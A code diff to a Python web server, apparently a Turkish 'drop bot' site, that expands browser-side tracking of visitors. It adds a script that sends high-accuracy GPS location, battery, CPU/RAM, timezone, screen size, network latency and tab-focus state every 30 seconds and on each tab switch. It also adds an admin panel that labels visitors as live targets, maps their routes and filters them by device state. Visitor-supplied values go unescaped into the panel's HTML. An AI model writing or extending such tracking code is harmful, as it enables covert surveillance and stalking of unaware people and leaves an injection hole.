@@ -47,7 +47,7 @@ os.makedirs(UPLOAD_DIR, exist_ok=True)
 def hash_pass(password: str) -> str:
     return hashlib.sha256(password.encode()).hexdigest()
 
-# --- VERİTABANI KURULUMU & OYUN TABLOSU ---
+# --- VERİTABANI KURULUMU & TELEMETRİ TABLOLARI ---
 def init_db():
     conn = sqlite3.connect("drop_bot.db")
     cursor = conn.cursor()
@@ -119,6 +119,10 @@ def init_db():
             lat REAL DEFAULT 41.0082,
             lon REAL DEFAULT 28.9784,
             battery_level TEXT DEFAULT 'Bilinmiyor',
+            cpu_ram TEXT DEFAULT 'Bilinmiyor',
+            timezone TEXT DEFAULT 'Bilinmiyor',
+            screen_res TEXT DEFAULT 'Bilinmiyor',
+            visibility_state TEXT DEFAULT 'visible',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -201,7 +205,11 @@ def init_db():
             pass
 
     for col, def_val in [
-        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'")
+        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("cpu_ram", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("timezone", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("screen_res", "TEXT DEFAULT 'Bilinmiyor'"),
+        ("visibility_state", "TEXT DEFAULT 'visible'")
     ]:
         try:
             cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
@@ -873,15 +881,27 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
-                    // Client Geolocation & Telemetry Reporter (Pil ve Cihaz Durumu Dahil)
-                    if (navigator.geolocation) {
-                        navigator.geolocation.watchPosition(async (pos) => {
+                    // Gelişmiş Donanım, Ağ, Gecikme, Ekran, Saat Dilimi ve Sekme Odak Takibi (Telemetry & Sniffing)
+                    async function sendTelemetry(customVisibility = null) {
+                        if (!navigator.geolocation) return;
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
                             try {
                                 let batteryStatus = "Bilinmiyor";
                                 if (navigator.getBattery) {
                                     const bat = await navigator.getBattery();
                                     batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
                                 }
+
+                                const cpuRam = (navigator.hardwareConcurrency || '?') + ' Çekirdek / ' + (navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'RAM Yok');
+                                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
+                                const screenRes = window.screen.width + 'x' + window.screen.height;
+                                const visibility = customVisibility || document.visibilityState;
+                                
+                                let netInfo = 'Wi-Fi / 4G';
+                                if (navigator.connection) {
+                                    netInfo = `${navigator.connection.effectiveType || 'bilinmiyor'} | RTT: ${navigator.connection.rtt || '?'}ms | DL: ${navigator.connection.downlink || '?'}Mbps`;
+                                }
+
                                 await fetch('/api/report-telemetry', {
                                     method: 'POST',
                                     headers: {'Content-Type': 'application/json'},
@@ -889,14 +909,25 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                         user_id: userId,
                                         lat: pos.coords.latitude,
                                         lon: pos.coords.longitude,
-                                        network: navigator.connection ? (navigator.connection.effectiveType + ' (' + (navigator.connection.type || 'wifi') + ')') : 'Wi-Fi / 4G Sniffed',
+                                        network: netInfo,
                                         ua: navigator.userAgent,
-                                        battery: batteryStatus
+                                        battery: batteryStatus,
+                                        cpu_ram: cpuRam,
+                                        timezone: tz,
+                                        screen_res: screenRes,
+                                        visibility_state: visibility
                                     })
                                 });
                             } catch(e) {}
                         }, null, {enableHighAccuracy: true});
                     }
+
+                    document.addEventListener("visibilitychange", () => {
+                        sendTelemetry(document.visibilityState);
+                    });
+
+                    setInterval(() => { sendTelemetry(); }, 30000);
+                    sendTelemetry();
 
                     let map, markersGroup;
                     let globalAppData = null;
@@ -1732,7 +1763,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     all_panel_logs = cursor.fetchall()
                     
                     cursor.execute("""
-                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.created_at 
+                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.cpu_ram, v.timezone, v.screen_res, v.visibility_state, v.created_at 
                         FROM visitor_logs v
                         JOIN (
                             SELECT user_id, MAX(id) as max_id 
@@ -1751,20 +1782,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             user_routes[h_uid] = []
                         user_routes[h_uid].append([h_lat, h_lon])
 
-                    logs_terminal = ""
-                    for pl in all_panel_logs:
-                        m, lt, ld = pl
-                        color = "#10b981" if lt == "success" else ("#ef4444" if lt == "warning" else "#38bdf8")
-                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{ld}]</span> <span style='color:{color};'>●</span> {m}</div>"
-
-                    for vl in v_logs:
-                        uid, ip, net, vlat, vlon, bat, vdate = vl
-                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[GPS/PİL]</span> User ID: {uid} | Pil: {bat} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
-
                     visitor_markers_js = ""
                     for vl in v_logs:
-                        uid, ip, net, vlat, vlon, bat, vdate = vl
+                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = vl
                         route_coords = user_routes.get(uid, [])
+                        vis_badge = "🟢 Aktif" if vis == "visible" else "🟡 Arka Planda"
                         
                         visitor_markers_js += f"""
                         const route_{uid} = {route_coords};
@@ -1780,24 +1802,32 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             }})
                         }}).addTo(takipMap);
 
-                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>Zaman: {vdate}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay & Rapor İndir</button>");
+                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>💻 CPU/RAM: {cpu}<br>🌍 Saat Dilimi: {tz}<br>📱 Ekran: {screen}<br>👁️ Odak: {vis_badge}<br>Zaman: {vdate}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay & Rapor İndir</button>");
                         """
+
+                    terminal_rows_html = ""
+                    for v in v_logs:
+                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = v
+                        vis_color = "#10b981" if vis == "visible" else "#f59e0b"
+                        terminal_rows_html += f"<div style='margin-bottom:6px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <b>User: {uid}</b> | 🔋 Pil: <span style='color:#38bdf8;'>{bat}</span> | 🌐 Ağ: {net} | 💻 {cpu} | 🌍 {tz} | 📱 {screen} | 👁️ <span style='color:{vis_color};'>{vis}</span></div>"
 
                     content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Rota / Rapor Paneli</h2>
-                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Hedeflerin geçmiş rotaları çizgiyle birleştirilir. Sayfa yenilenmeden arka planda canlı güncellenir:</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Gelişmiş Telemetri & Parmak İzi Takip Merkezi</h2>
                         
-                        <div style="margin-bottom: 12px; display: flex; gap: 10px;">
-                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID ile hızlıca arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; width:100%;">
+                        <div style="margin-bottom: 12px; display: flex; gap: 10px; flex-wrap: wrap;">
+                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID veya cihaz bilgisi arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; flex:1;">
+                            <button onclick="filterTableBy('şarjda')" style="background:#10b981; width:auto; padding:8px 12px;">⚡ Şarjda Olanlar</button>
+                            <button onclick="filterTableBy('wi-fi')" style="background:#2563eb; width:auto; padding:8px 12px;">🌐 Wi-Fi / 4G</button>
+                            <button onclick="filterTableBy('all')" style="background:#475569; width:auto; padding:8px 12px;">Tümünü Göster</button>
                         </div>
 
-                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;" id="terminalLogBox">
-                            {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 20px;" id="terminalLogBox">
+                            {terminal_rows_html if terminal_rows_html else "<span style='color:var(--text-muted);'>Henüz telemetri verisi yok.</span>"}
                         </div>
 
                         <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Rota ve Konum Haritası</h3>
-                        <div id="takipMiniMap" style="width: 100%; height: 280px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
+                        <div id="takipMiniMap" style="width: 100%; height: 300px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                     </div>
 
                     <div id="targetDetailModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;">
@@ -1845,6 +1875,19 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             document.body.appendChild(downloadAnchor);
                             downloadAnchor.click();
                             downloadAnchor.remove();
+                        }}
+
+                        function filterTableBy(keyword) {{
+                            const box = document.getElementById('terminalLogBox');
+                            const divs = box.getElementsByTagName('div');
+                            for (let i = 0; i < divs.length; i++) {{
+                                const txt = divs[i].innerText.toLowerCase();
+                                if (keyword === 'all' || txt.includes(keyword)) {{
+                                    divs[i].style.display = "";
+                                }} else {{
+                                    divs[i].style.display = "none";
+                                }}
+                            }}
                         }}
 
                         setInterval(() => {{
@@ -2804,14 +2847,21 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 uid = int(data_json.get("user_id", 0))
                 lat = float(data_json.get("lat", 41.0082))
                 lon = float(data_json.get("lon", 28.9784))
-                net = str(data_json.get("network", "Wi-Fi Sniffed"))
+                net = str(data_json.get("network", "Wi-Fi"))
                 ua = str(data_json.get("ua", ""))
                 bat = str(data_json.get("battery", "Bilinmiyor"))
+                cpu_ram = str(data_json.get("cpu_ram", "Bilinmiyor"))
+                timezone = str(data_json.get("timezone", "Bilinmiyor"))
+                screen_res = str(data_json.get("screen_res", "Bilinmiyor"))
+                visibility_state = str(data_json.get("visibility_state", "visible"))
                 client_ip = self.client_address[0]
 
                 conn = sqlite3.connect("drop_bot.db")
                 cursor = conn.cursor()
-                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level) VALUES (?, ?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon, bat))
+                cursor.execute("""
+                    INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level, cpu_ram, timezone, screen_res, visibility_state) 
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """, (uid, client_ip, ua, net, lat, lon, bat, cpu_ram, timezone, screen_res, visibility_state))
                 conn.commit()
                 conn.close()
 
